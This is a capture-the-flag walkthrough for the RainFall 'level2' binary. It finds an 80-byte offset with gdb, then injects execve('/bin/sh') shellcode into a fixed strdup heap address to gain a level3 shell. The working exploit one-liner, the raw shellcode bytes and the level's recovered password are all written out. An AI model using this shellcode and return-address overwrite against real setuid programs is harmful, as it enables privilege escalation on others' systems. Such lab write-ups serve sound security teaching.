# level2:

level2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
level2@RainFall:~$ file level2
level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
level2@RainFall:~$ 

# after analyzing the code, we will exploit 'gets' function once again, but this time it's different.
# we don't have any code in the binary that will open a shell for us, so we will try to inject code
# that will open a shell for us during runtime, and overwrite return address through the input to 'gets'
# function. But there's a problem: there's a check that prevents overwriting the return address
# to any address of the range 0x0b000000 -- 0x0bffffff
# but the buffer (that is written to by gets) is duplicated into heap memory using 'strdup'.

# we notice that strdup returns always same heap address (0x0804a008):
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                   = 0
gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5
)                        = 0xbffff70c
puts(""
)                                                             = 1
strdup("")                                                           = 0x0804a008
+++ exited (status 8) +++
level2@RainFall:~$

# so why not injecting shellcode through input (hence shellcode will start at 0x0804a008) and then 
# overwriting return address to 0x0804a008.
# for reference: shellcode is in ./Resources/shell.asm

# let's find the offset to the return address using the pattern generator ./Resources/patternGen.py:

(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
(gdb) break *0x0804854a
Breakpoint 1 at 0x804854a
(gdb) run
Starting program: /home/user/level2/level2 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVQQQQRRRRSSSS
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVQQQQRRRRSSSS

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
(gdb) print $eip
$1 = (void (*)()) 0x55555555

# so the offset is 80 bytes

# solution:

level2@RainFall:~$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80" + "A" * 48 + "\x08\xa0\x04\x08"'; cat) | ./level2
1�Ph//shh/bin��PS��1Ұ
                     1�@1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
